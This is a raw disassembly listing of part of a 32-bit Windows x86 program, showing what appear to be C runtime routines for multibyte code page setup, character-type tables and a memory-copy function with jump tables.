  414dd7:	6a 00                	push   $0x0
  414dd9:	ff 74 24 0c          	push   0xc(%esp)
  414ddd:	e8 c2 ff ff ff       	call   0x414da4
  414de2:	83 c4 0c             	add    $0xc,%esp
  414de5:	c3                   	ret
  414de6:	2d a4 03 00 00       	sub    $0x3a4,%eax
  414deb:	74 22                	je     0x414e0f
  414ded:	83 e8 04             	sub    $0x4,%eax
  414df0:	74 17                	je     0x414e09
  414df2:	83 e8 0d             	sub    $0xd,%eax
  414df5:	74 0c                	je     0x414e03
  414df7:	48                   	dec    %eax
  414df8:	74 03                	je     0x414dfd
  414dfa:	33 c0                	xor    %eax,%eax
  414dfc:	c3                   	ret
  414dfd:	b8 04 04 00 00       	mov    $0x404,%eax
  414e02:	c3                   	ret
  414e03:	b8 12 04 00 00       	mov    $0x412,%eax
  414e08:	c3                   	ret
  414e09:	b8 04 08 00 00       	mov    $0x804,%eax
  414e0e:	c3                   	ret
  414e0f:	b8 11 04 00 00       	mov    $0x411,%eax
  414e14:	c3                   	ret
  414e15:	57                   	push   %edi
  414e16:	6a 40                	push   $0x40
  414e18:	33 c0                	xor    %eax,%eax
  414e1a:	59                   	pop    %ecx
  414e1b:	bf 00 71 45 00       	mov    $0x457100,%edi
  414e20:	f3 ab                	rep stos %eax,%es:(%edi)
  414e22:	aa                   	stos   %al,%es:(%edi)
  414e23:	33 c0                	xor    %eax,%eax
  414e25:	a3 04 72 45 00       	mov    %eax,0x457204
  414e2a:	a3 e0 70 45 00       	mov    %eax,0x4570e0
  414e2f:	a3 d8 70 45 00       	mov    %eax,0x4570d8
  414e34:	bf 10 72 45 00       	mov    $0x457210,%edi
  414e39:	ab                   	stos   %eax,%es:(%edi)
  414e3a:	ab                   	stos   %eax,%es:(%edi)
  414e3b:	ab                   	stos   %eax,%es:(%edi)
  414e3c:	5f                   	pop    %edi
  414e3d:	c3                   	ret
  414e3e:	55                   	push   %ebp
  414e3f:	8b ec                	mov    %esp,%ebp
  414e41:	81 ec 18 05 00 00    	sub    $0x518,%esp
  414e47:	a1 10 62 45 00       	mov    0x456210,%eax
  414e4c:	33 45 04             	xor    0x4(%ebp),%eax
  414e4f:	56                   	push   %esi
  414e50:	89 45 fc             	mov    %eax,-0x4(%ebp)
  414e53:	8d 45 e8             	lea    -0x18(%ebp),%eax
  414e56:	50                   	push   %eax
  414e57:	ff 35 04 72 45 00    	push   0x457204
  414e5d:	ff 15 00 81 41 00    	call   *0x418100
  414e63:	83 f8 01             	cmp    $0x1,%eax
  414e66:	be 00 01 00 00       	mov    $0x100,%esi
  414e6b:	0f 85 0d 01 00 00    	jne    0x414f7e
  414e71:	33 c0                	xor    %eax,%eax
  414e73:	88 84 05 e8 fe ff ff 	mov    %al,-0x118(%ebp,%eax,1)
  414e7a:	40                   	inc    %eax
  414e7b:	3b c6                	cmp    %esi,%eax
  414e7d:	72 f4                	jb     0x414e73
  414e7f:	8a 45 ee             	mov    -0x12(%ebp),%al
  414e82:	84 c0                	test   %al,%al
  414e84:	c6 85 e8 fe ff ff 20 	movb   $0x20,-0x118(%ebp)
  414e8b:	74 36                	je     0x414ec3
  414e8d:	53                   	push   %ebx
  414e8e:	8d 55 ef             	lea    -0x11(%ebp),%edx
  414e91:	57                   	push   %edi
  414e92:	0f b6 0a             	movzbl (%edx),%ecx
  414e95:	0f b6 c0             	movzbl %al,%eax
  414e98:	3b c1                	cmp    %ecx,%eax
  414e9a:	77 1d                	ja     0x414eb9
  414e9c:	2b c8                	sub    %eax,%ecx
  414e9e:	41                   	inc    %ecx
  414e9f:	8b d9                	mov    %ecx,%ebx
  414ea1:	c1 e9 02             	shr    $0x2,%ecx
  414ea4:	8d bc 05 e8 fe ff ff 	lea    -0x118(%ebp,%eax,1),%edi
  414eab:	b8 20 20 20 20       	mov    $0x20202020,%eax
  414eb0:	f3 ab                	rep stos %eax,%es:(%edi)
  414eb2:	8b cb                	mov    %ebx,%ecx
  414eb4:	83 e1 03             	and    $0x3,%ecx
  414eb7:	f3 aa                	rep stos %al,%es:(%edi)
  414eb9:	42                   	inc    %edx
  414eba:	8a 02                	mov    (%edx),%al
  414ebc:	42                   	inc    %edx
  414ebd:	84 c0                	test   %al,%al
  414ebf:	75 d1                	jne    0x414e92
  414ec1:	5f                   	pop    %edi
  414ec2:	5b                   	pop    %ebx
  414ec3:	6a 00                	push   $0x0
  414ec5:	ff 35 d8 70 45 00    	push   0x4570d8
  414ecb:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  414ed1:	ff 35 04 72 45 00    	push   0x457204
  414ed7:	50                   	push   %eax
  414ed8:	56                   	push   %esi
  414ed9:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  414edf:	50                   	push   %eax
  414ee0:	6a 01                	push   $0x1
  414ee2:	e8 c0 1b 00 00       	call   0x416aa7
  414ee7:	6a 00                	push   $0x0
  414ee9:	ff 35 04 72 45 00    	push   0x457204
  414eef:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  414ef5:	56                   	push   %esi
  414ef6:	50                   	push   %eax
  414ef7:	56                   	push   %esi
  414ef8:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  414efe:	50                   	push   %eax
  414eff:	56                   	push   %esi
  414f00:	ff 35 d8 70 45 00    	push   0x4570d8
  414f06:	e8 88 0b 00 00       	call   0x415a93
  414f0b:	6a 00                	push   $0x0
  414f0d:	ff 35 04 72 45 00    	push   0x457204
  414f13:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  414f19:	56                   	push   %esi
  414f1a:	50                   	push   %eax
  414f1b:	56                   	push   %esi
  414f1c:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  414f22:	50                   	push   %eax
  414f23:	68 00 02 00 00       	push   $0x200
  414f28:	ff 35 d8 70 45 00    	push   0x4570d8
  414f2e:	e8 60 0b 00 00       	call   0x415a93
  414f33:	83 c4 5c             	add    $0x5c,%esp
  414f36:	33 c0                	xor    %eax,%eax
  414f38:	66 8b 8c 45 e8 fa ff 	mov    -0x518(%ebp,%eax,2),%cx
  414f3f:	ff 
  414f40:	f6 c1 01             	test   $0x1,%cl
  414f43:	74 16                	je     0x414f5b
  414f45:	80 88 01 71 45 00 10 	orb    $0x10,0x457101(%eax)
  414f4c:	8a 8c 05 e8 fd ff ff 	mov    -0x218(%ebp,%eax,1),%cl
  414f53:	88 88 20 72 45 00    	mov    %cl,0x457220(%eax)
  414f59:	eb 1c                	jmp    0x414f77
  414f5b:	f6 c1 02             	test   $0x2,%cl
  414f5e:	74 10                	je     0x414f70
  414f60:	80 88 01 71 45 00 20 	orb    $0x20,0x457101(%eax)
  414f67:	8a 8c 05 e8 fc ff ff 	mov    -0x318(%ebp,%eax,1),%cl
  414f6e:	eb e3                	jmp    0x414f53
  414f70:	80 a0 20 72 45 00 00 	andb   $0x0,0x457220(%eax)
  414f77:	40                   	inc    %eax
  414f78:	3b c6                	cmp    %esi,%eax
  414f7a:	72 bc                	jb     0x414f38
  414f7c:	eb 44                	jmp    0x414fc2
  414f7e:	33 c0                	xor    %eax,%eax
  414f80:	83 f8 41             	cmp    $0x41,%eax
  414f83:	72 19                	jb     0x414f9e
  414f85:	83 f8 5a             	cmp    $0x5a,%eax
  414f88:	77 14                	ja     0x414f9e
  414f8a:	80 88 01 71 45 00 10 	orb    $0x10,0x457101(%eax)
  414f91:	8a c8                	mov    %al,%cl
  414f93:	80 c1 20             	add    $0x20,%cl
  414f96:	88 88 20 72 45 00    	mov    %cl,0x457220(%eax)
  414f9c:	eb 1f                	jmp    0x414fbd
  414f9e:	83 f8 61             	cmp    $0x61,%eax
  414fa1:	72 13                	jb     0x414fb6
  414fa3:	83 f8 7a             	cmp    $0x7a,%eax
  414fa6:	77 0e                	ja     0x414fb6
  414fa8:	80 88 01 71 45 00 20 	orb    $0x20,0x457101(%eax)
  414faf:	8a c8                	mov    %al,%cl
  414fb1:	80 e9 20             	sub    $0x20,%cl
  414fb4:	eb e0                	jmp    0x414f96
  414fb6:	80 a0 20 72 45 00 00 	andb   $0x0,0x457220(%eax)
  414fbd:	40                   	inc    %eax
  414fbe:	3b c6                	cmp    %esi,%eax
  414fc0:	72 be                	jb     0x414f80
  414fc2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  414fc5:	33 4d 04             	xor    0x4(%ebp),%ecx
  414fc8:	5e                   	pop    %esi
  414fc9:	e8 3e ec ff ff       	call   0x413c0c
  414fce:	c9                   	leave
  414fcf:	c3                   	ret
  414fd0:	55                   	push   %ebp
  414fd1:	8b ec                	mov    %esp,%ebp
  414fd3:	83 ec 1c             	sub    $0x1c,%esp
  414fd6:	a1 10 62 45 00       	mov    0x456210,%eax
  414fdb:	33 45 04             	xor    0x4(%ebp),%eax
  414fde:	53                   	push   %ebx
  414fdf:	56                   	push   %esi
  414fe0:	8b 75 08             	mov    0x8(%ebp),%esi
  414fe3:	33 db                	xor    %ebx,%ebx
  414fe5:	3b f3                	cmp    %ebx,%esi
  414fe7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  414fea:	57                   	push   %edi
  414feb:	0f 84 54 01 00 00    	je     0x415145
  414ff1:	33 d2                	xor    %edx,%edx
  414ff3:	33 c0                	xor    %eax,%eax
  414ff5:	39 b0 48 63 45 00    	cmp    %esi,0x456348(%eax)
  414ffb:	74 65                	je     0x415062
  414ffd:	83 c0 30             	add    $0x30,%eax
  415000:	42                   	inc    %edx
  415001:	3d f0 00 00 00       	cmp    $0xf0,%eax
  415006:	72 ed                	jb     0x414ff5
  415008:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  41500b:	50                   	push   %eax
  41500c:	56                   	push   %esi
  41500d:	ff 15 00 81 41 00    	call   *0x418100
  415013:	83 f8 01             	cmp    $0x1,%eax
  415016:	0f 85 21 01 00 00    	jne    0x41513d
  41501c:	6a 40                	push   $0x40
  41501e:	33 c0                	xor    %eax,%eax
  415020:	83 7d e4 01          	cmpl   $0x1,-0x1c(%ebp)
  415024:	59                   	pop    %ecx
  415025:	bf 00 71 45 00       	mov    $0x457100,%edi
  41502a:	f3 ab                	rep stos %eax,%es:(%edi)
  41502c:	aa                   	stos   %al,%es:(%edi)
  41502d:	89 35 04 72 45 00    	mov    %esi,0x457204
  415033:	89 1d d8 70 45 00    	mov    %ebx,0x4570d8
  415039:	0f 86 ec 00 00 00    	jbe    0x41512b
  41503f:	80 7d ea 00          	cmpb   $0x0,-0x16(%ebp)
  415043:	0f 84 ba 00 00 00    	je     0x415103
  415049:	8d 4d eb             	lea    -0x15(%ebp),%ecx
  41504c:	8a 11                	mov    (%ecx),%dl
  41504e:	84 d2                	test   %dl,%dl
  415050:	0f 84 ad 00 00 00    	je     0x415103
  415056:	0f b6 41 ff          	movzbl -0x1(%ecx),%eax
  41505a:	0f b6 d2             	movzbl %dl,%edx
  41505d:	e9 91 00 00 00       	jmp    0x4150f3
  415062:	6a 40                	push   $0x40
  415064:	33 c0                	xor    %eax,%eax
  415066:	59                   	pop    %ecx
  415067:	bf 00 71 45 00       	mov    $0x457100,%edi
  41506c:	f3 ab                	rep stos %eax,%es:(%edi)
  41506e:	8d 0c 52             	lea    (%edx,%edx,2),%ecx
  415071:	c1 e1 04             	shl    $0x4,%ecx
  415074:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  415077:	aa                   	stos   %al,%es:(%edi)
  415078:	8d 99 58 63 45 00    	lea    0x456358(%ecx),%ebx
  41507e:	8a 03                	mov    (%ebx),%al
  415080:	8b f3                	mov    %ebx,%esi
  415082:	eb 29                	jmp    0x4150ad
  415084:	8a 56 01             	mov    0x1(%esi),%dl
  415087:	84 d2                	test   %dl,%dl
  415089:	74 26                	je     0x4150b1
  41508b:	0f b6 c0             	movzbl %al,%eax
  41508e:	0f b6 fa             	movzbl %dl,%edi
  415091:	3b c7                	cmp    %edi,%eax
  415093:	77 14                	ja     0x4150a9
  415095:	8b 55 f8             	mov    -0x8(%ebp),%edx
  415098:	8a 92 40 63 45 00    	mov    0x456340(%edx),%dl
  41509e:	08 90 01 71 45 00    	or     %dl,0x457101(%eax)
  4150a4:	40                   	inc    %eax
  4150a5:	3b c7                	cmp    %edi,%eax
  4150a7:	76 f5                	jbe    0x41509e
  4150a9:	46                   	inc    %esi
  4150aa:	46                   	inc    %esi
  4150ab:	8a 06                	mov    (%esi),%al
  4150ad:	84 c0                	test   %al,%al
  4150af:	75 d3                	jne    0x415084
  4150b1:	ff 45 f8             	incl   -0x8(%ebp)
  4150b4:	83 c3 08             	add    $0x8,%ebx
  4150b7:	83 7d f8 04          	cmpl   $0x4,-0x8(%ebp)
  4150bb:	72 c1                	jb     0x41507e
  4150bd:	8b 45 08             	mov    0x8(%ebp),%eax
  4150c0:	a3 04 72 45 00       	mov    %eax,0x457204
  4150c5:	c7 05 e0 70 45 00 01 	movl   $0x1,0x4570e0
  4150cc:	00 00 00 
  4150cf:	e8 12 fd ff ff       	call   0x414de6
  4150d4:	8d 89 4c 63 45 00    	lea    0x45634c(%ecx),%ecx
  4150da:	8b f1                	mov    %ecx,%esi
  4150dc:	bf 10 72 45 00       	mov    $0x457210,%edi
  4150e1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4150e2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4150e3:	a3 d8 70 45 00       	mov    %eax,0x4570d8
  4150e8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4150e9:	eb 5f                	jmp    0x41514a
  4150eb:	80 88 01 71 45 00 04 	orb    $0x4,0x457101(%eax)
  4150f2:	40                   	inc    %eax
  4150f3:	3b c2                	cmp    %edx,%eax
  4150f5:	76 f4                	jbe    0x4150eb
  4150f7:	41                   	inc    %ecx
  4150f8:	41                   	inc    %ecx
  4150f9:	80 79 ff 00          	cmpb   $0x0,-0x1(%ecx)
  4150fd:	0f 85 49 ff ff ff    	jne    0x41504c
  415103:	33 c9                	xor    %ecx,%ecx
  415105:	41                   	inc    %ecx
  415106:	8b c1                	mov    %ecx,%eax
  415108:	80 88 01 71 45 00 08 	orb    $0x8,0x457101(%eax)
  41510f:	40                   	inc    %eax
  415110:	3d ff 00 00 00       	cmp    $0xff,%eax
  415115:	72 f1                	jb     0x415108
  415117:	8b c6                	mov    %esi,%eax
  415119:	e8 c8 fc ff ff       	call   0x414de6
  41511e:	a3 d8 70 45 00       	mov    %eax,0x4570d8
  415123:	89 0d e0 70 45 00    	mov    %ecx,0x4570e0
  415129:	eb 06                	jmp    0x415131
  41512b:	89 1d e0 70 45 00    	mov    %ebx,0x4570e0
  415131:	33 c0                	xor    %eax,%eax
  415133:	bf 10 72 45 00       	mov    $0x457210,%edi
  415138:	ab                   	stos   %eax,%es:(%edi)
  415139:	ab                   	stos   %eax,%es:(%edi)
  41513a:	ab                   	stos   %eax,%es:(%edi)
  41513b:	eb 0d                	jmp    0x41514a
  41513d:	39 1d 54 6f 45 00    	cmp    %ebx,0x456f54
  415143:	74 0e                	je     0x415153
  415145:	e8 cb fc ff ff       	call   0x414e15
  41514a:	e8 ef fc ff ff       	call   0x414e3e
  41514f:	33 c0                	xor    %eax,%eax
  415151:	eb 03                	jmp    0x415156
  415153:	83 c8 ff             	or     $0xffffffff,%eax
  415156:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  415159:	33 4d 04             	xor    0x4(%ebp),%ecx
  41515c:	5f                   	pop    %edi
  41515d:	5e                   	pop    %esi
  41515e:	5b                   	pop    %ebx
  41515f:	e8 a8 ea ff ff       	call   0x413c0c
  415164:	c9                   	leave
  415165:	c3                   	ret
  415166:	6a 14                	push   $0x14
  415168:	68 30 86 41 00       	push   $0x418630
  41516d:	e8 a2 de ff ff       	call   0x413014
  415172:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  415176:	6a 0d                	push   $0xd
  415178:	e8 a6 ed ff ff       	call   0x413f23
  41517d:	59                   	pop    %ecx
  41517e:	33 ff                	xor    %edi,%edi
  415180:	89 7d fc             	mov    %edi,-0x4(%ebp)
  415183:	89 3d 54 6f 45 00    	mov    %edi,0x456f54
  415189:	8b 45 08             	mov    0x8(%ebp),%eax
  41518c:	83 f8 fe             	cmp    $0xfffffffe,%eax
  41518f:	75 12                	jne    0x4151a3
  415191:	c7 05 54 6f 45 00 01 	movl   $0x1,0x456f54
  415198:	00 00 00 
  41519b:	ff 15 fc 80 41 00    	call   *0x4180fc
  4151a1:	eb 2b                	jmp    0x4151ce
  4151a3:	83 f8 fd             	cmp    $0xfffffffd,%eax
  4151a6:	75 12                	jne    0x4151ba
  4151a8:	c7 05 54 6f 45 00 01 	movl   $0x1,0x456f54
  4151af:	00 00 00 
  4151b2:	ff 15 f8 80 41 00    	call   *0x4180f8
  4151b8:	eb 14                	jmp    0x4151ce
  4151ba:	83 f8 fc             	cmp    $0xfffffffc,%eax
  4151bd:	75 0f                	jne    0x4151ce
  4151bf:	c7 05 54 6f 45 00 01 	movl   $0x1,0x456f54
  4151c6:	00 00 00 
  4151c9:	a1 9c 6f 45 00       	mov    0x456f9c,%eax
  4151ce:	89 45 08             	mov    %eax,0x8(%ebp)
  4151d1:	3b 05 04 72 45 00    	cmp    0x457204,%eax
  4151d7:	0f 84 bb 00 00 00    	je     0x415298
  4151dd:	8b 35 dc 70 45 00    	mov    0x4570dc,%esi
  4151e3:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4151e6:	3b f7                	cmp    %edi,%esi
  4151e8:	74 04                	je     0x4151ee
  4151ea:	39 3e                	cmp    %edi,(%esi)
  4151ec:	74 10                	je     0x4151fe
  4151ee:	68 20 02 00 00       	push   $0x220
  4151f3:	e8 ea d0 ff ff       	call   0x4122e2
  4151f8:	59                   	pop    %ecx
  4151f9:	8b f0                	mov    %eax,%esi
  4151fb:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4151fe:	3b f7                	cmp    %edi,%esi
  415200:	74 7f                	je     0x415281
  415202:	ff 75 08             	push   0x8(%ebp)
  415205:	e8 c6 fd ff ff       	call   0x414fd0
  41520a:	59                   	pop    %ecx
  41520b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  41520e:	3b c7                	cmp    %edi,%eax
  415210:	75 6f                	jne    0x415281
  415212:	89 3e                	mov    %edi,(%esi)
  415214:	a1 04 72 45 00       	mov    0x457204,%eax
  415219:	89 46 04             	mov    %eax,0x4(%esi)
  41521c:	a1 e0 70 45 00       	mov    0x4570e0,%eax
  415221:	89 46 08             	mov    %eax,0x8(%esi)
  415224:	a1 d8 70 45 00       	mov    0x4570d8,%eax
  415229:	89 46 0c             	mov    %eax,0xc(%esi)
  41522c:	33 c0                	xor    %eax,%eax
  41522e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  415231:	83 f8 05             	cmp    $0x5,%eax
  415234:	7d 10                	jge    0x415246
  415236:	66 8b 0c 45 10 72 45 	mov    0x457210(,%eax,2),%cx
  41523d:	00 
  41523e:	66 89 4c 46 10       	mov    %cx,0x10(%esi,%eax,2)
  415243:	40                   	inc    %eax
  415244:	eb e8                	jmp    0x41522e
  415246:	33 c0                	xor    %eax,%eax
  415248:	89 45 dc             	mov    %eax,-0x24(%ebp)
  41524b:	3d 01 01 00 00       	cmp    $0x101,%eax
  415250:	7d 0d                	jge    0x41525f
  415252:	8a 88 00 71 45 00    	mov    0x457100(%eax),%cl
  415258:	88 4c 30 1c          	mov    %cl,0x1c(%eax,%esi,1)
  41525c:	40                   	inc    %eax
  41525d:	eb e9                	jmp    0x415248
  41525f:	33 c0                	xor    %eax,%eax
  415261:	89 45 dc             	mov    %eax,-0x24(%ebp)
  415264:	3d 00 01 00 00       	cmp    $0x100,%eax
  415269:	7d 10                	jge    0x41527b
  41526b:	8a 88 20 72 45 00    	mov    0x457220(%eax),%cl
  415271:	88 8c 30 1d 01 00 00 	mov    %cl,0x11d(%eax,%esi,1)
  415278:	40                   	inc    %eax
  415279:	eb e6                	jmp    0x415261
  41527b:	89 35 dc 70 45 00    	mov    %esi,0x4570dc
  415281:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  415285:	75 14                	jne    0x41529b
  415287:	3b 35 dc 70 45 00    	cmp    0x4570dc,%esi
  41528d:	74 0c                	je     0x41529b
  41528f:	56                   	push   %esi
  415290:	e8 35 cf ff ff       	call   0x4121ca
  415295:	59                   	pop    %ecx
  415296:	eb 03                	jmp    0x41529b
  415298:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  41529b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  41529f:	e8 09 00 00 00       	call   0x4152ad
  4152a4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4152a7:	e8 a3 dd ff ff       	call   0x41304f
  4152ac:	c3                   	ret
  4152ad:	6a 0d                	push   $0xd
  4152af:	e8 db eb ff ff       	call   0x413e8f
  4152b4:	59                   	pop    %ecx
  4152b5:	c3                   	ret
  4152b6:	83 3d 6c 74 45 00 00 	cmpl   $0x0,0x45746c
  4152bd:	75 12                	jne    0x4152d1
  4152bf:	6a fd                	push   $0xfffffffd
  4152c1:	e8 a0 fe ff ff       	call   0x415166
  4152c6:	59                   	pop    %ecx
  4152c7:	c7 05 6c 74 45 00 01 	movl   $0x1,0x45746c
  4152ce:	00 00 00 
  4152d1:	33 c0                	xor    %eax,%eax
  4152d3:	c3                   	ret
  4152d4:	cc                   	int3
  4152d5:	cc                   	int3
  4152d6:	cc                   	int3
  4152d7:	cc                   	int3
  4152d8:	cc                   	int3
  4152d9:	cc                   	int3
  4152da:	cc                   	int3
  4152db:	cc                   	int3
  4152dc:	cc                   	int3
  4152dd:	cc                   	int3
  4152de:	cc                   	int3
  4152df:	cc                   	int3
  4152e0:	55                   	push   %ebp
  4152e1:	8b ec                	mov    %esp,%ebp
  4152e3:	57                   	push   %edi
  4152e4:	56                   	push   %esi
  4152e5:	8b 75 0c             	mov    0xc(%ebp),%esi
  4152e8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4152eb:	8b 7d 08             	mov    0x8(%ebp),%edi
  4152ee:	8b c1                	mov    %ecx,%eax
  4152f0:	8b d1                	mov    %ecx,%edx
  4152f2:	03 c6                	add    %esi,%eax
  4152f4:	3b fe                	cmp    %esi,%edi
  4152f6:	76 08                	jbe    0x415300
  4152f8:	3b f8                	cmp    %eax,%edi
  4152fa:	0f 82 7c 01 00 00    	jb     0x41547c
  415300:	f7 c7 03 00 00 00    	test   $0x3,%edi
  415306:	75 14                	jne    0x41531c
  415308:	c1 e9 02             	shr    $0x2,%ecx
  41530b:	83 e2 03             	and    $0x3,%edx
  41530e:	83 f9 08             	cmp    $0x8,%ecx
  415311:	72 29                	jb     0x41533c
  415313:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  415315:	ff 24 95 2c 54 41 00 	jmp    *0x41542c(,%edx,4)
  41531c:	8b c7                	mov    %edi,%eax
  41531e:	ba 03 00 00 00       	mov    $0x3,%edx
  415323:	83 e9 04             	sub    $0x4,%ecx
  415326:	72 0c                	jb     0x415334
  415328:	83 e0 03             	and    $0x3,%eax
  41532b:	03 c8                	add    %eax,%ecx
  41532d:	ff 24 85 40 53 41 00 	jmp    *0x415340(,%eax,4)
  415334:	ff 24 8d 3c 54 41 00 	jmp    *0x41543c(,%ecx,4)
  41533b:	90                   	nop
  41533c:	ff 24 8d c0 53 41 00 	jmp    *0x4153c0(,%ecx,4)
  415343:	90                   	nop
  415344:	50                   	push   %eax
  415345:	53                   	push   %ebx
  415346:	41                   	inc    %ecx
  415347:	00 7c 53 41          	add    %bh,0x41(%ebx,%edx,2)
  41534b:	00 a0 53 41 00 23    	add    %ah,0x23004153(%eax)
  415351:	d1 8a 06 88 07 8a    	rorl   -0x75f877fa(%edx)
  415357:	46                   	inc    %esi
  415358:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  41535e:	02 c1                	add    %cl,%al
  415360:	e9 02 88 47 02       	jmp    0x288db67
  415365:	83 c6 03             	add    $0x3,%esi
  415368:	83 c7 03             	add    $0x3,%edi
  41536b:	83 f9 08             	cmp    $0x8,%ecx
  41536e:	72 cc                	jb     0x41533c
  415370:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  415372:	ff 24 95 2c 54 41 00 	jmp    *0x41542c(,%edx,4)
  415379:	8d 49 00             	lea    0x0(%ecx),%ecx
  41537c:	23 d1                	and    %ecx,%edx
  41537e:	8a 06                	mov    (%esi),%al
  415380:	88 07                	mov    %al,(%edi)
  415382:	8a 46 01             	mov    0x1(%esi),%al
  415385:	c1 e9 02             	shr    $0x2,%ecx
  415388:	88 47 01             	mov    %al,0x1(%edi)
  41538b:	83 c6 02             	add    $0x2,%esi
  41538e:	83 c7 02             	add    $0x2,%edi
  415391:	83 f9 08             	cmp    $0x8,%ecx
  415394:	72 a6                	jb     0x41533c
  415396:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  415398:	ff 24 95 2c 54 41 00 	jmp    *0x41542c(,%edx,4)
  41539f:	90                   	nop
  4153a0:	23 d1                	and    %ecx,%edx
  4153a2:	8a 06                	mov    (%esi),%al
  4153a4:	88 07                	mov    %al,(%edi)
  4153a6:	83 c6 01             	add    $0x1,%esi
  4153a9:	c1 e9 02             	shr    $0x2,%ecx
  4153ac:	83 c7 01             	add    $0x1,%edi
  4153af:	83 f9 08             	cmp    $0x8,%ecx
  4153b2:	72 88                	jb     0x41533c
  4153b4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4153b6:	ff 24 95 2c 54 41 00 	jmp    *0x41542c(,%edx,4)
  4153bd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4153c0:	23 54 41 00          	and    0x0(%ecx,%eax,2),%edx
  4153c4:	10 54 41 00          	adc    %dl,0x0(%ecx,%eax,2)
  4153c8:	08 54 41 00          	or     %dl,0x0(%ecx,%eax,2)
  4153cc:	00 54 41 00          	add    %dl,0x0(%ecx,%eax,2)
  4153d0:	f8                   	clc
  4153d1:	53                   	push   %ebx
  4153d2:	41                   	inc    %ecx
  4153d3:	00 f0                	add    %dh,%al
  4153d5:	53                   	push   %ebx
  4153d6:	41                   	inc    %ecx
  4153d7:	00 e8                	add    %ch,%al
  4153d9:	53                   	push   %ebx
  4153da:	41                   	inc    %ecx
  4153db:	00 e0                	add    %ah,%al
  4153dd:	53                   	push   %ebx
  4153de:	41                   	inc    %ecx
  4153df:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  4153e5:	44                   	inc    %esp
  4153e6:	8f                   	(bad)
  4153e7:	e4 8b                	in     $0x8b,%al
  4153e9:	44                   	inc    %esp
  4153ea:	8e e8                	mov    %eax,%gs
  4153ec:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  4153f0:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  4153f4:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  4153f8:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  4153fc:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  415400:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  415404:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  415408:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  41540c:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  415410:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  415414:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  415418:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  41541f:	03 f0                	add    %eax,%esi
  415421:	03 f8                	add    %eax,%edi
  415423:	ff 24 95 2c 54 41 00 	jmp    *0x41542c(,%edx,4)
  41542a:	8b ff                	mov    %edi,%edi
  41542c:	3c 54                	cmp    $0x54,%al
  41542e:	41                   	inc    %ecx
  41542f:	00 44 54 41          	add    %al,0x41(%esp,%edx,2)
  415433:	00 50 54             	add    %dl,0x54(%eax)
  415436:	41                   	inc    %ecx
  415437:	00 64 54 41          	add    %ah,0x41(%esp,%edx,2)
  41543b:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  415441:	c9                   	leave
  415442:	c3                   	ret
  415443:	90                   	nop
  415444:	8a 06                	mov    (%esi),%al
  415446:	88 07                	mov    %al,(%edi)
  415448:	8b 45 08             	mov    0x8(%ebp),%eax
  41544b:	5e                   	pop    %esi
  41544c:	5f                   	pop    %edi
  41544d:	c9                   	leave
  41544e:	c3                   	ret
  41544f:	90                   	nop
  415450:	8a 06                	mov    (%esi),%al
  415452:	88 07                	mov    %al,(%edi)
  415454:	8a 46 01             	mov    0x1(%esi),%al
  415457:	88 47 01             	mov    %al,0x1(%edi)
  41545a:	8b 45 08             	mov    0x8(%ebp),%eax
  41545d:	5e                   	pop    %esi
  41545e:	5f                   	pop    %edi
  41545f:	c9                   	leave
  415460:	c3                   	ret
  415461:	8d 49 00             	lea    0x0(%ecx),%ecx
  415464:	8a 06                	mov    (%esi),%al
  415466:	88 07                	mov    %al,(%edi)
  415468:	8a 46 01             	mov    0x1(%esi),%al
  41546b:	88 47 01             	mov    %al,0x1(%edi)
  41546e:	8a 46 02             	mov    0x2(%esi),%al
  415471:	88 47 02             	mov    %al,0x2(%edi)
  415474:	8b 45 08             	mov    0x8(%ebp),%eax
  415477:	5e                   	pop    %esi
  415478:	5f                   	pop    %edi
  415479:	c9                   	leave
  41547a:	c3                   	ret
  41547b:	90                   	nop
  41547c:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  415480:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
